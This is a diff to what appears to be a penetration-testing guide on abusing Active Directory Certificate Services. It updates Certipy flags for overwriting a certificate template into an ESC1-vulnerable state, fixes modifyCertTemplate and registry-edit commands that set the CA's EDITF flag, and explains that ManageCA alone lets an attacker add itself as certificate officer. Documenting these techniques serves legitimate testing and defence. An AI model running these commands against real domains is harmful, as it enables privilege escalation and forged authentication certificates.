@@ -53,21 +53,28 @@ In order to obtain an abusable template, some attributes and parameters need to 
 <Tabs items={['UNIX-like', 'Windows']}>
 <Tab value="UNIX-like">
 
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries, and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries, and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. Certipy also backs up the original configuration so it can be restored afterwards.
 
 ```bash
-# 1. Overwrite the certificate template and save the old configuration
-certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -save-old
+# 1. Reconfigure the template to a known ESC1-vulnerable state
+#    (Certipy 5 automatically saves the current config to <templateName>.json)
+certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -write-default-configuration
 
 # 2. After the ESC1 attack, restore the original configuration
-certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -configuration 'templateName.json'
+certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -write-configuration templateName.json
 ```
+
+<Callout type="info">
+
+The `-save-old` / `-configuration` flags shown in older write-ups were removed in Certipy 5; use `-write-default-configuration` / `-write-configuration` instead (check `certipy template -h` for your version).
+
+</Callout>
 
 If a more precise template modification is needed, [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify each attributes of the template.
 
 ```bash
 # 1. Disable Manager Approval Requirement
-modifyCertTemplate.py -template templateName -value 2 -property mspki-enrobashllment-flag "$DOMAIN/$USER:$PASSWORD"
+modifyCertTemplate.py -template templateName -value 0 -property mspki-enrollment-flag "$DOMAIN/$USER:$PASSWORD"
 
 # 2. Disable Authorized Signature Requirement
 modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature "$DOMAIN/$USER:$PASSWORD"
@@ -145,7 +152,7 @@ The attack can be carried out from UNIX-like systems as follows.
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags
 
 # bitwise OR to set the flag if not already (nothing changed if already set)
-python3 -c print("NEW_VALUE:", VALUE | 0x40000)
+python3 -c 'print("NEW_VALUE:", VALUE | 0x40000)'
 
 # write flags
 reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" add-keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
@@ -231,7 +238,7 @@ The certificate can then be used with [Pass-The-Certificate](/ad/movement/kerber
 
 From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object, and to request a certificate that requires manager approval.
 
-In this example, both `ManageCA` and `ManageCertificates` are already obtained. There is no known method to obtain the `ManageCertificates` right.
+In this example, both `ManageCA` and `ManageCertificates` are already obtained. A principal holding only `ManageCA` can grant itself `ManageCertificates` by adding itself as a certificate officer (from UNIX-like systems, `certipy ca -add-officer`), so `ManageCA` alone is sufficient to reach this state.
 
 Then, [PSPKI](https://github.com/PKISolutions/PSPKI) (PowerShell) can be used to approve a certificate request ([RSAT](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) is needed on the machine where PSPKI is used). PSPKI is a PowerShell module used to "simplify various PKI and AD CS management tasks".
 
